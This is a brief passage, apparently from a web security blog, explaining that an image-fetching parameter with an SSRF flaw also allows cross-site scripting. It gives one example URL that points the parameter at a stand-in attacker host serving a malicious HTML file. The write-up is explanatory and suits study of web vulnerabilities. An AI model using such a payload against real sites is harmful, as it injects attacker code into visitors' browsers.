...
If you've payed attention in this blog you maybe will guess which vulnerability is present in that picture above aside from SSRF? If you've guessed XSS, that's correct. In this case an attacker can just upload a <code>.html</code> file with his malicious client-side code and send it like this <code>http://example.com/?image=http://attacker.com/evil.html</code><br><br>
